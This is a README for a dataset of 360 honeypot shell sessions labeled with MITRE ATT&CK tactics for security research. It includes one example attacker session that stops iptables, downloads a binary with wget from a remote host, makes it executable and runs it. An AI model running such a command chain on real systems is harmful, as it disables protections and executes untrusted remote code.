# HaaS supervised corpus

## Corpus

This folder contains 360 session from the [Honeypot as a Service](https://haas.nic.cz/) collection. The data were labeled under the supervision of a team of experts such that each statement (i.e., chunk of a Unix session separated by ";", "|", "||" or "&&") is assigned a [Mitre Tactic](https://attack.mitre.org/tactics/enterprise/).

For instance, the session:

```shell
etc/init.d/iptables stop ; wget –c http://10.10.10.10:8080/exec ; chmod 777 exec ; ./exec ;
```

Contains 4 statements and is labeled as following:
`Impact -- Execution -- Execution -- Execution`

You can easily read the sessions with pandas. For instance:

```python
df = pd.read_json("full_supervised_corpus.json", orient="index")
```

## Split corpus into train and test

The script `split_partitions.py` creates two json files. One contains a training corpus (e.g., `train_corpus.parquet`), while the other creates a test corpus (e.g., `test_corpus.parquet`). The developer launches the script with a parameter `--seed`, which will define the splitting, and a parameter `--test_size`, which is the portion of data in the test set wrt the training. For instance:

```shell
python split_partitions.py --seed 1 --test_size 0.2
```

Creates the two samples partitions `train_corpus.parquet` and `test_corpus.parquet`. Run:

```shell
python split_partitions.py --help
```

fort further details.

## Contributing

Sessions were chosen in order to be representative of the Mitre Classes. Still, we welcome contributions from the community to enhance LogPrécis further. If you have any ideas, bug reports, or feature requests, please contact our team at [matteo.boffa@polito.it](mailto:matteo.boffa@polito.it) and [idilio.drago@unito.it](mailto:idilio.drago@unito.it).
